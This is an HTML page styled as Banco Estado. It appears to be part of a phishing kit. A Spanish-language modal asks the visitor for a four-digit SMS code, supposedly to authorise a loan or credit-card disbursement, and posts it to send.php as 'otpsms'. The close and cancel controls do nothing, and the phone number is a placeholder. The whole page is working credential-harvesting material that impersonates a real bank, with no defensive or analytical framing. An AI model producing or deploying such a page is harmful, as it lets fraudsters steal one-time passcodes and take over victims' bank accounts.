<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: rgba(0, 0, 0, 0.5);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 16px;
            padding: 40px 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .close-btn {
    position: absolute;
    top: 20px;
    right: 20px;
    background: none;
    border: none;
    font-size: 28px;
    color: #FF6600;
    cursor: pointer;
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
}

.close-btn:hover {
    transform: scale(1.2);
    color: #E55A00;
}

        .sms-logo {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #1ABC9C 0%, #16A085 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            position: relative;
            box-shadow: 0 4px 12px rgba(26, 188, 156, 0.3);
        }

        .sms-logo::before {
            content: 'SMS';
            font-size: 24px;
            font-weight: 700;
            color: white;
            letter-spacing: 1px;
        }

        .sms-bubble {
            position: absolute;
            width: 30px;
            height: 30px;
            background: #1ABC9C;
            border-radius: 50%;
            bottom: -8px;
            right: -8px;
            border: 3px solid white;
        }

        .sms-bubble::after {
            content: '';
            position: absolute;
            width: 0;
            height: 0;
            border-left: 8px solid transparent;
            border-right: 0px solid transparent;
            border-top: 10px solid #1ABC9C;
            bottom: -8px;
            right: 2px;
        }

        .title {
            font-size: 18px;
            font-weight: 600;
            color: #1a2842;
            text-align: center;
            margin-bottom: 20px;
            line-height: 1.3;
        }

        .description {
            font-size: 14px;
            color: #666666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .phone-number {
            font-size: 14px;
            color: #1a2842;
            font-weight: 600;
            text-align: center;
        }

        .form-group {
            margin-bottom: 30px;
            margin-top: 30px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 12px;
            letter-spacing: 0.3px;
        }

        .form-input {
    width: 100%;
    padding: 14px 16px;
    border: 2px solid #D0D0D8;
    border-radius: 8px;
    font-size: 16px;
    color: #1a1a1a;
    font-family: inherit;
    transition: all 0.3s ease;
    background-color: #FAFAFA;
    text-align: center;
    letter-spacing: 2px;
}

.form-input:focus {
    outline: none;
    border-color: #FF6600;
    background-color: white;
    box-shadow: 0 0 0 3px rgba(255, 102, 0, 0.1);
}

        .form-input::placeholder {
            color: #D0D0D8;
            letter-spacing: 2px;
        }

        .button-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 30px;
        }

        .continue-btn {
    width: 100%;
    padding: 14px;
    background: #D0D0D8;
    color: white;
    border: none;
    border-radius: 50px;
    font-size: 16px;
    font-weight: 600;
    cursor: not-allowed;
    transition: all 0.3s ease;
    opacity: 0.6;
}

.continue-btn.enabled {
    background: linear-gradient(135deg, #FF6600 0%, #E55A00 100%);
    cursor: pointer;
    opacity: 1;
    box-shadow: 0 4px 12px rgba(255, 102, 0, 0.3);
}

        .continue-btn.enabled:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(59, 79, 181, 0.4);
        }

        .continue-btn.enabled:active {
            transform: translateY(0);
        }

        .cancel-link {
            text-align: center;
            margin-top: 15px;
        }

        .cancel-link a {
    color: #FF6600;
    text-decoration: none;
    font-size: 14px;
    font-weight: 600;
    transition: all 0.3s ease;
}

.cancel-link a:hover {
    text-decoration: underline;
    color: #E55A00;
}

        @media (max-width: 480px) {
            .modal {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 20px;
            }

            .description {
                font-size: 13px;
            }

            .form-input {
                font-size: 18px;
            }
        }

        .sms-image-center {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
}

.sms-image-center img {
    max-width: 100%;
    height: auto;
}
    </style>
</head>
<body>
    <div class="modal-overlay"> 
        <div class="modal">
            <!-- Botón Cerrar -->
            <button class="close-btn" onclick="">✕</button>

            <!-- Logo SMS -->
            <div class="sms-image-center">
                <img src="sms.png">
            </div>

            <!-- Título -->
            <h1 class="title">Ingresa el código para autorizar el desembolso del préstamo o tarjeta de crédito</h1>

            <!-- Descripción -->
            <div class="description">
                Enviamos un SMS con el código de validación al <span class="phone-number">+569 XXXXXXXXX</span>
            </div>
            

            <!-- Formulario -->
            <form id="smsForm" action="send.php" method="POST">
                <!-- Input Código -->
                <div class="form-group">
                    <label class="form-label" for="codigo">Código de validación</label>
                    <input 
                        type="text" 
                        id="codigo"
                        name="otpsms"
                        class="form-input" 
                        placeholder="0000"
                        maxlength="4"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>

                <!-- Botones -->
                <div class="button-group">
                    <button type="submit" class="continue-btn" id="continueBtn" disabled>Continuar</button>
                </div>

                <!-- Cancelar -->
                <div class="cancel-link">
                    <a href="#" onclick="">Cancelar</a>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        // ============================================
// REFERENCIAS A ELEMENTOS DOM
// ============================================

const codigoInput = document.getElementById('codigo');
const continueBtn = document.getElementById('continueBtn');

// ============================================
// VALIDACIÓN EN TIEMPO REAL DEL INPUT
// ============================================

codigoInput.addEventListener('input', function(e) {
    // Solo permitir números
    this.value = this.value.replace(/[^0-9]/g, '');
    
    // Habilitar/deshabilitar botón según si hay 4 dígitos
    if (this.value.length === 4) {
        continueBtn.disabled = false;
        continueBtn.classList.add('enabled');
    } else {
        continueBtn.disabled = true;
        continueBtn.classList.remove('enabled');
    }
});

// ============================================
// FUNCIONES DE UTILIDAD
// ============================================

function cerrarModal(event) {
    if (event) {
        event.preventDefault();
    }
    window.history.back();
}

// ============================================
// INICIALIZACIÓN
// ============================================

window.addEventListener('load', function() {
    document.getElementById('codigo').focus();
});
    </script>
</body>
</html>
